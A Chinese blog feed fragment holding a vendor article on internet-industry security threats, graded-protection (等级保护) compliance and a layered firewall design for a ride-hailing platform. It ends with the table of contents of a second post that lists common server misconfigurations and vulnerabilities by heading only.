1994年，中国通过一条64K的国际专线接入互联网。20年后，互联网带给整个中国经济模式的改变已经影响到了社会的方方面面。可以说，互联网极大地改变了中国，而这种改变仍在继续。 中国拥有庞大的网民数量，大量的需求被创造，给新的互联网行业形态出现奠定良好基础。其次，中国互联网行业的商业模式日渐成熟。网络广告、搜索引擎、电子商务、网络支付等业务日渐被人接受，各大互联网公司从各自核心领域优势向这几个方面渗透，形成有序竞争，带动互联网行业良性发展。再次，中国网络基础设施的建设、4G/5G互联网的发展、国家政策的扶持规划，均给整个互联网行业创造了一个非常好的前景。 中国的互联网企业发展迅速，目前已有多家跻身全球互联网公司市值排行榜top10中，像大家熟知的阿里巴巴、京东、腾讯及百度均榜上有名。 相对于传统行业，互联网行业还显得很年轻，在一派欣欣向荣的快速发展背后，互联网行业同时隐藏着让人难以捉摸的巨大的安全风险，由于技术和监管的诸多问题，使得该行业已陷入危机四伏的困境中。 2016年4月3日，土耳其爆发重大数据泄露事件，近5000W土耳其公民个人信息被黑客打包放置网络上任人下载。为证明被盗数据的真实性，黑客还公布土耳其现任总统埃尔多安的个人信息以作示范。 2016年7月29日，越南两个机场被黑客攻击，这是越南遭受迄今最严重的黑客攻击事件。黑客通过攻陷机场电子显示屏及广播系统，散发“南海是中国的固有领土”等信息，给机场候机的乘客带来视觉和听觉上的冲击，造成的混乱远超常见的攻击网页行为。 而在最近披露的一项报道中，俄罗斯黑客成功盗取了2.723亿个帐号，以俄罗斯最受欢迎的电子邮件服务Mail.ru用户为主，此外还有Gmail地址、雅虎以及微软电邮Hotmail用户。数以亿计的数据目前正在“俄罗斯的地下黑市”出售。 不只是境外企业，国内互联网企业也正在成为最大的受害者。2016上半年，全国互联网企业安全漏洞总量同比增长181.9%。相关人士表示，目前互联网行业存在很大的安全隐患，而且伴随着相当程度的数据泄露风险。 0x02 起-黑客重点攻击的行业目标 作为一种新生事物，互联网企业起步于民营企业，很多小平台风险意识淡薄，把关注重点放在扩大客户规模、赚取利润上。而技术防护则严重缺失，另外出于成本考虑，大多数企业采用廉价的开源系统，这些系统存在大量风险漏洞，安全性严重缺乏保障，企业数据安全岌岌可危。那么知名大企业又如何呢？随着互联网技术的发展，黑客技术也在升级，企业投入巨大财力和人力研发的系统，同样存在不可预知的问题。因此，也不可避免的遭受黑客的恶意攻击。近年来，知名大企业数据泄露事件频频发生，逐年增多。 据调查统计，黑客攻击互联网企业平台的目的主要为窃取数据，占比高达48%，其次为敲诈勒索和商业竞争。 通过攻陷大批互联网企业平台，引起系统瘫痪，黑客还能将数据恶意修改、洗劫一空。此外，黑客还可能通过申请账号、篡改数据、冒充投资人进行恶意提现甚至盗取资金。 企业数据泄露，造成的不只是业务的巨大损失，更为重要的是信誉上的丧失。互联网企业的门户网站作为信誉展示的首要平台，如果因为网站信息泄露、宕机、页面篡改等原因导致用户信任丧失，那么平台也就丢失了本身的信誉，成为无源之水。 因此，互联网企业如何有效保护信息安全，事关企业生死存亡。 0x03 转-国家信息安全的基本保障制度 互联网行业是需要依托互联网的，其核心业务需要IT系统的支撑，因此安全是首当其冲的。而等级保护是国家推行的在Cyber空间安全的强制保护制度，其最终目的是保护信息系统和基础信息网络不受到侵害，保护用户的业务数据和系统的服务功能。 从1994年国务院颁布的《中华人民共和国计算机信息系统安全保护条例》（147号令）开始，到今年（2016年）10月份在昆明举办的由公安部网络安全保卫局、中央网信办网络安全协调局、工信部网络安全管理局、国家密码管理局、国家保密局、中国科学院办公厅为指导单位和由公安部第三研究所主办的第五届全国信息安全等级保护技术大会上提出的进入等级保护制度2.0时代为止，等级保护这一项国家政策已经走过逾20个年头，等级保护不仅是对信息安全产品或系统的检测、评估以及定级，更重要的，它是围绕信息安全保障全过程的一项基础性的国家管理制度，是一项基础性和制度性的工作。 如何帮助互联网企业有效的防范网络入侵、网络拒绝服务攻击以及网络非法监听等恶意网络行为，就有必要了解相应的合规要求。而国家等级保护标准中对于网络安全方面的要求，特别是对网络安全管理、访问控制、入侵防范、网络设备防护、安全审计的相关条款对于和网络密不可分的互联网企业来说，确实有着十分重要且重大的意义。 0x04 赋-等级保护之于互联网企业的意义 在互联网产业不断融合的态势下，互联网跨界融合竞争的趋势越发凸显，线上与线下问题不断交织，新现象、新问题不断涌现，政府的管理也面临前所未有的挑战。因此从2015年，工信部开始进一步加强和改进互联网行业管理，促进互联网企业良性有序发展。” 信息安全是永远不变的话题，工信部部长苗圩认为应该高度重视我们所面临的严峻安全形势，大力提升网络与信息安全的保障能力。“促进互联网融合发展，安全是基础，更是保障，必须处理好安全与发展的关系，做到协调一致。不断健全互联网行业网络和信息安全机制，持续推进信息安全和体制化建设，推动完善网络安全的法律法规、标准体系，严格落实互联网企业信息安全的责任，加强网络信息安全监管和网络环境的综合治理。” 除却自身发展面临的网络安全问题，国家有关部门对互联网行业网络安全方面的监管力度也逐年增加。在内部需求和外部监管的双重压力下，加快互联网企业信息安全等级保护建设显得迫在眉睫。 国家等级保护的核心思想： 全方位划分安全等级是实施信息安全等级保护的基本条件； 信息系统等级化安全设计是实施信息安全等级保护的基本方法。 信息安全技术和信息安全管理是实现信息系统安全的基础。企业必须根据安全建设目标将需求分析结果进行逐步细化，并转化为信息安全体系建设的总体安全策略，根据登记保护建设的具体要求，可以形成技术层面的安全管理和管理层面的安全策略并通过总体安全策略的落实构建安全技术体系和安全管理体系框架。对于互联网企业来说，实施信息安全等级保护测评能够有效地提高企业信息系统安全建设的整体水平，有效控制企业信息安全建设成本；有利于明确国家、法人和其他组织、公民的信息安全责任，加强企业信息安全管理。 对于企业的信息系统来说，通过等级保护测评可及时发现信息系统安全状况并制定方案进行整改，当信息系统完全达到安全保护能力要求时，信息系统就基本可做到“进不来、拿不走、改不了、看不懂、跑不了、可审计、打不垮”。 对抗能力和恢复能力已然构成了信息系统的安全保护能力。安全保护能力主要表现为信息系统应对威胁的能力，但当信息系统无法阻挡威胁对自身的破坏时，信息系统的恢复能力使系统在一定时间内恢复到原有状态，从而降低负面影响。 对信息安全技术和信息安全管理进行等级划分是信息系统安全等级保护的需要，也是对信息安全技术和信息安全管理进行规范化的需要。 0x05 比-互联网企业的等级保护解决方案 按照国家信息安全等级保护的相关标准，互联网企业一般通过第三方测评机构或安全厂商按照如下流程进行等保建设： 同时，按照等级保护中针对技术和管理的不同要求，应持续开展如下工作： 【保障基础设施安全】保障网络周边环境和物理特性引起的网络设备和线路的持续使用。 【保障网络连接安全】保障网络传输中的安全，尤其保障网络边界和外部接入中的安全。 【保障计算环境的安全】保障操作系统、数据库、服务器、用户终端及相关商用产品的安全。 【保障应用系统安全】保障应用程序层对网络信息的保密性、完整性和信源的真实的保护和鉴别，防止和抵御各种安全威胁和攻击手段，在一定程度上弥补和完善现有操作系统和网络信息系统的安全风险。 【保障数据安全及备份恢复】保障数据完整性、数据保密性、备份和恢复等。 【安全管理体系保障】根据国家有关信息安全等级保护方面的标准和规范要求，建立一套切实可行的安全管理体系，加强安全管理机制。 0x06 兴-巨人背后的安全专家 针对互联网企业的信息安全等级保护建设，绿盟科技作为国内安全厂商当仁不让的领军品牌，基于对信息安全的深刻理解，以为互联网客户信息系统构建“等级化的安全体系”为等级保护工作的服务理念，旨在根据等级保护不同等级、不同阶段的业务特性、安全需求及安全应用重点，为互联网客户在等级保护的框架下构建一个安全、可靠、灵活、可持续改进的信息安全体系。 由于网约车新政的落地实施，交管局明令要求各大网约车平台尽可能快的进行线上业务系统的三级等级保护测评，因为最终测评通过与否关系着该平台营业执照的办理。 以下以易到租车为例，详细阐述绿盟科技针对互联网用户的信息安全等级保护建设。 各网约车平台由于自身业务系统的差异，对预约系统应用架构会有不同的设计，但基本的技术构成是类似的，其各部分的功能也相似。 针对易到租车预约APP核心应用的等保三级安全建设，绿盟科技本着“重点防护，纵深防御”的原则，在各服务器区以防火墙作为区域安全边界，为提高预约业务的整体安全性，各区域边界防火墙采用功能与性能兼备的产品，由此在整体布局上形成了“多层异构防火墙”安全架构。从业务功能上考虑，把这种安全架构划分成四个安全区域：互联网接入区、DMZ区（接入WEB服务器、RA服务器）、核心业务区（接入APP服务器、DB服务器）、数据中心内网区。 互联网接入区： 部署链路分担设备，提供多ISP的互联网接入。 部署流量清洗，防御DDOS攻击 部署外网边界防火墙，实现互联网与DMZ区隔离 DMZ区： 部署WAF，为WEB服务器提供深层次的安全保护； 部署WEB-APP边界防火墙，实现DMZ与核心业务区的隔离； 核心业务区 APP服务器与DB服务器间可部署防火墙实现访问控制； 部署内网边界防火墙，实现核心业务区与数据中心服务器区间的隔离； DB服务器旁路接入DAS，实现对数据库的监听与审计 数据中心内网区 采用“核心 —— 边缘”分区模块化架构，各服务器区围绕网络核心区部署， 各服务器区与网络核心区之间通过防火墙做访问控制； 内网核心旁路接入SAS-H，实现对IP可达的所有设备的单点登录及运维审计 安全技术手段作为支撑，辅以绿盟科技等保咨询服务，为客户搭建信息安全管理与策略体系。如此双管齐下，既能满足国家信息安全等级保护相关政策与标准要求，又可为客户搭建等级化的安全保障体系，在全面防护中突出重点，帮助客户最终通过等保三级测评，不仅提升了安全防护能力，也间接增强了客户的核心竞争力。 0x07 终-NSFOCUS 伴您扬帆远航 互联网行业的三级安全等保技术要求，既有与其它行业要求的共性，又有其自己的特点。 三级等保对于互联网企业既是一次命题考试，又是一次切实提升企业安全能力的好机会。作为等保技术要求的主要部分——网络安全，因其分散、覆盖面广和难以管理，也是整个等保安全的难点。绿盟科技从网络与安全融合、终端与边界融合、集中与分级融合等多个维度，覆盖了包括结构安全、访问控制、安全审计、边界完整性、入侵防范、恶意代码入侵和设备防护在内的绝大多数技术要求，为互联网客户提供完整的三级等保解决方案方案。</summary></entry><entry><title type="html">安全运维那些洞-Aerfa</title><link href="http://localhost:4000/2018/10/29/%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%E9%82%A3%E4%BA%9B%E6%B4%9E/" rel="alternate" type="text/html" title="安全运维那些洞-Aerfa" /><published>2018-10-29T11:46:20+08:00</published><updated>2018-10-29T11:46:20+08:00</updated><id>http://localhost:4000/2018/10/29/%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%E9%82%A3%E4%BA%9B%E6%B4%9E</id><content type="html" xml:base="http://localhost:4000/2018/10/29/%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%E9%82%A3%E4%BA%9B%E6%B4%9E/">&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#0-readme&quot; id=&quot;markdown-toc-0-readme&quot;&gt;0 Readme&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#1-ftp匿名访问或弱口令&quot; id=&quot;markdown-toc-1-ftp匿名访问或弱口令&quot;&gt;1 ftp匿名访问或弱口令&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#11-ftp匿名访问&quot; id=&quot;markdown-toc-11-ftp匿名访问&quot;&gt;1.1 ftp匿名访问&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#12-ftp常见弱口令&quot; id=&quot;markdown-toc-12-ftp常见弱口令&quot;&gt;1.2 ftp常见弱口令&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#13-边学边用&quot; id=&quot;markdown-toc-13-边学边用&quot;&gt;1.3 边学边用&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#2-rsync匿名访问&quot; id=&quot;markdown-toc-2-rsync匿名访问&quot;&gt;2 rsync匿名访问&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#21-利用方法&quot; id=&quot;markdown-toc-21-利用方法&quot;&gt;2.1 利用方法&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#22-安全配置&quot; id=&quot;markdown-toc-22-安全配置&quot;&gt;2.2 安全配置&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#23-活学活用&quot; id=&quot;markdown-toc-23-活学活用&quot;&gt;2.3 活学活用&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#3-dns域传送漏洞&quot; id=&quot;markdown-toc-3-dns域传送漏洞&quot;&gt;3 DNS域传送漏洞&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#31-漏洞成因&quot; id=&quot;markdown-toc-31-漏洞成因&quot;&gt;3.1 漏洞成因&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#32-攻击方式&quot; id=&quot;markdown-toc-32-攻击方式&quot;&gt;3.2 攻击方式&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#33-修复方案&quot; id=&quot;markdown-toc-33-修复方案&quot;&gt;3.3 修复方案&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#4-weblogic弱口令&quot; id=&quot;markdown-toc-4-weblogic弱口令&quot;&gt;4 weblogic弱口令&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#41-基本信息&quot; id=&quot;markdown-toc-41-基本信息&quot;&gt;4.1 基本信息&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#42-利用方式&quot; id=&quot;markdown-toc-42-利用方式&quot;&gt;4.2 利用方式&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#43-安全配置&quot; id=&quot;markdown-toc-43-安全配置&quot;&gt;4.3 安全配置&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#44-现学现卖&quot; id=&quot;markdown-toc-44-现学现卖&quot;&gt;4.4 现学现卖&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#5-struts漏洞&quot; id=&quot;markdown-toc-5-struts漏洞&quot;&gt;5 struts漏洞&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#51-s2-016命令执行漏洞&quot; id=&quot;markdown-toc-51-s2-016命令执行漏洞&quot;&gt;5.1 S2-016命令执行漏洞&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#52-s2-017重定向漏洞&quot; id=&quot;markdown-toc-52-s2-017重定向漏洞&quot;&gt;5.2 S2-017重定向漏洞&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#53-s2-019命令执行漏洞&quot; id=&quot;markdown-toc-53-s2-019命令执行漏洞&quot;&gt;5.3 S2-019命令执行漏洞&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#6-web服务器解析漏洞&quot; id=&quot;markdown-toc-6-web服务器解析漏洞&quot;&gt;6 web服务器解析漏洞&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#61-iis-60&quot; id=&quot;markdown-toc-61-iis-60&quot;&gt;6.1 IIS 6.0&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#62-iis-70iis-75nginx0837&quot; id=&quot;markdown-toc-62-iis-70iis-75nginx0837&quot;&gt;6.2 IIS 7.0/IIS 7.5/Nginx&amp;lt;=0.8.37&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#63-nginx0837&quot; id=&quot;markdown-toc-63-nginx0837&quot;&gt;6.3 Nginx&amp;lt;=0.8.37&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#64-apache&quot; id=&quot;markdown-toc-64-apache&quot;&gt;6.4 Apache&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#65-lighttpd&quot; id=&quot;markdown-toc-65-lighttpd&quot;&gt;6.5 lighttpd&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#66-windows环境&quot; id=&quot;markdown-toc-66-windows环境&quot;&gt;6.6 windows环境&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#7-php-cgi远程任意代码执行漏洞&quot; id=&quot;markdown-toc-7-php-cgi远程任意代码执行漏洞&quot;&gt;7 PHP-CGI远程任意代码执行漏洞&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#71-本地包含执行代码&quot; id=&quot;markdown-toc-71-本地包含执行代码&quot;&gt;7.1 本地包含执行代码&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#72-远程包含执行代码&quot; id=&quot;markdown-toc-72-远程包含执行代码&quot;&gt;7.2 远程包含执行代码&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#8-fck编辑器上传漏洞&quot; id=&quot;markdown-toc-8-fck编辑器上传漏洞&quot;&gt;8 FCK编辑器上传漏洞&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#81-漏洞利用&quot; id=&quot;markdown-toc-81-漏洞利用&quot;&gt;8.1 漏洞利用&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#9-apache-server-status对外暴露&quot; id=&quot;markdown-toc-9-apache-server-status对外暴露&quot;&gt;9 Apache Server Status对外暴露&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#91-利用方式&quot; id=&quot;markdown-toc-91-利用方式&quot;&gt;9.1 利用方式&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#10-网站备份文件可下载&quot; id=&quot;markdown-toc-10-网站备份文件可下载&quot;&gt;10 网站备份文件可下载&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#101-利用方式&quot; id=&quot;markdown-toc-101-利用方式&quot;&gt;10.1 利用方式&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#11-目录遍历并查看敏感数据&quot; id=&quot;markdown-toc-11-目录遍历并查看敏感数据&quot;&gt;11 目录遍历并查看敏感数据&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#111-利用方式&quot; id=&quot;markdown-toc-111-利用方式&quot;&gt;11.1 利用方式&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#12-snmp信息泄露&quot; id=&quot;markdown-toc-12-snmp信息泄露&quot;&gt;12 SNMP信息泄露&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#121-基本原理&quot; id=&quot;markdown-toc-121-基本原理&quot;&gt;12.1 基本原理&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#122-snmp弱口令&quot; id=&quot;markdown-toc-122-snmp弱口令&quot;&gt;12.2 snmp弱口令&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#123-snmp获取管理员密码&quot; id=&quot;markdown-toc-123-snmp获取管理员密码&quot;&gt;12.3 snmp获取管理员密码&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#124-实战演练&quot; id=&quot;markdown-toc-124-实战演练&quot;&gt;12.4 实战演练&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#13-svn源码泄露&quot; id=&quot;markdown-toc-13-svn源码泄露&quot;&gt;13 SVN源码泄露&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#131-svn介绍&quot; id=&quot;markdown-toc-131-svn介绍&quot;&gt;13.1 SVN介绍&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#132-漏洞原理&quot; id=&quot;markdown-toc-132-漏洞原理&quot;&gt;13.2 漏洞原理&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#14-hadhoop应用对外访问&quot; id=&quot;markdown-toc-14-hadhoop应用对外访问&quot;&gt;14 hadhoop应用对外访问&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#141-基础概念&quot; id=&quot;markdown-toc-141-基础概念&quot;&gt;14.1 基础概念&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#142-漏洞利用&quot; id=&quot;markdown-toc-142-漏洞利用&quot;&gt;14.2 漏洞利用&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#15-nagios信息泄露&quot; id=&quot;markdown-toc-15-nagios信息泄露&quot;&gt;15 Nagios信息泄露&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#151-漏洞利用&quot; id=&quot;markdown-toc-151-漏洞利用&quot;&gt;15.1 漏洞利用&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#16-rtx即时通信信息泄露&quot; id=&quot;markdown-toc-16-rtx即时通信信息泄露&quot;&gt;16 RTX即时通信信息泄露&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#161-漏洞利用&quot; id=&quot;markdown-toc-161-漏洞利用&quot;&gt;16.1 漏洞利用&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#162-动手实践&quot; id=&quot;markdown-toc-162-动手实践&quot;&gt;16.2 动手实践&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#17-ganglia系统监控信息泄露&quot; id=&quot;markdown-toc-17-ganglia系统监控信息泄露&quot;&gt;17 Ganglia系统监控信息泄露&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#171-漏洞利用&quot; id=&quot;markdown-toc-171-漏洞利用&quot;&gt;17.1 漏洞利用&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#18-j2ee应用架构web服务器搭配不当&quot; id=&quot;markdown-toc-18-j2ee应用架构web服务器搭配不当&quot;&gt;18 j2ee应用架构（web服务器搭配不当）&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#181-漏洞成因&quot; id=&quot;markdown-toc-181-漏洞成因&quot;&gt;18.1 漏洞成因&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#182-漏洞利用&quot; id=&quot;markdown-toc-182-漏洞利用&quot;&gt;18.2 漏洞利用&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#183-修复方案&quot; id=&quot;markdown-toc-183-修复方案&quot;&gt;18.3 修复方案&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#19-jenkins平台未设置登录验证&quot; id=&quot;markdown-toc-19-jenkins平台未设置登录验证&quot;&gt;19 Jenkins平台未设置登录验证&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#191-漏洞利用&quot; id=&quot;markdown-toc-191-漏洞利用&quot;&gt;19.1 漏洞利用&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#20-zabbix默认口令&quot; id=&quot;markdown-toc-20-zabbix默认口令&quot;&gt;20 zabbix默认口令&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#201-基础知识&quot; id=&quot;markdown-toc-201-基础知识&quot;&gt;20.1 基础知识&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#202-利用方式&quot; id=&quot;markdown-toc-202-利用方式&quot;&gt;20.2 利用方式&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#21-zenoss默认口令&quot; id=&quot;markdown-toc-21-zenoss默认口令&quot;&gt;21 zenoss默认口令&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#211-基本知识&quot; id=&quot;markdown-toc-211-基本知识&quot;&gt;21.1 基本知识&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#212-漏洞利用&quot; id=&quot;markdown-toc-212-漏洞利用&quot;&gt;21.2 漏洞利用&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#22-resin任意文件读取&quot; id=&quot;markdown-toc-22-resin任意文件读取&quot;&gt;22 Resin任意文件读取&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#221-基本知识&quot; id=&quot;markdown-toc-221-基本知识&quot;&gt;22.1 基本知识&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#222-漏洞利用&quot; id=&quot;markdown-toc-222-漏洞利用&quot;&gt;22.2 漏洞利用&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#223-实例演练&quot; id=&quot;markdown-toc-223-实例演练&quot;&gt;22.3 实例演练&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#23-memcache未限制访问ip&quot; id=&quot;markdown-toc-23-memcache未限制访问ip&quot;&gt;23 memcache未限制访问IP&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#231-基础知识&quot; id=&quot;markdown-toc-231-基础知识&quot;&gt;23.1 基础知识&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#232-漏洞利用&quot; id=&quot;markdown-toc-232-漏洞利用&quot;&gt;23.2 漏洞利用&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#233-实战演练&quot; id=&quot;markdown-toc-233-实战演练&quot;&gt;23.3 实战演练&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#24-jboss配置不当&quot; id=&quot;markdown-toc-24-jboss配置不当&quot;&gt;24 Jboss配置不当&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#241-基本信息&quot; id=&quot;markdown-toc-241-基本信息&quot;&gt;24.1 基本信息&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#242-漏洞利用&quot; id=&quot;markdown-toc-242-漏洞利用&quot;&gt;24.2 漏洞利用&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#243-实例应用&quot; id=&quot;markdown-toc-243-实例应用&quot;&gt;24.3 实例应用&lt;/a&gt;        &lt;ul&gt;
+          &lt;li&gt;&lt;a href=&quot;#1-admin-console-getshell&quot; id=&quot;markdown-toc-1-admin-console-getshell&quot;&gt;&amp;lt;1&amp;gt; admin-console getshell&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#2-jmx-console-getshell&quot; id=&quot;markdown-toc-2-jmx-console-getshell&quot;&gt;&amp;lt;2&amp;gt; jmx-console getshell&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#3-web-console-getshell&quot; id=&quot;markdown-toc-3-web-console-getshell&quot;&gt;&amp;lt;3&amp;gt; web-console getshell&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#41-invoker-getshell&quot; id=&quot;markdown-toc-41-invoker-getshell&quot;&gt;&amp;lt;41&amp;gt; invoker getshell&lt;/a&gt;&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#25-测试机外网可访问&quot; id=&quot;markdown-toc-25-测试机外网可访问&quot;&gt;25 测试机外网可访问&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#26-padding-oracle-attack&quot; id=&quot;markdown-toc-26-padding-oracle-attack&quot;&gt;26 padding oracle attack&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#261-基础知识&quot; id=&quot;markdown-toc-261-基础知识&quot;&gt;26.1 基础知识&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#262-漏洞利用&quot; id=&quot;markdown-toc-262-漏洞利用&quot;&gt;26.2 漏洞利用&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#27-tomcat弱口令&quot; id=&quot;markdown-toc-27-tomcat弱口令&quot;&gt;27 tomcat弱口令&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#271-基础知识&quot; id=&quot;markdown-toc-271-基础知识&quot;&gt;27.1 基础知识&lt;/a&gt;&lt;/li&gt;
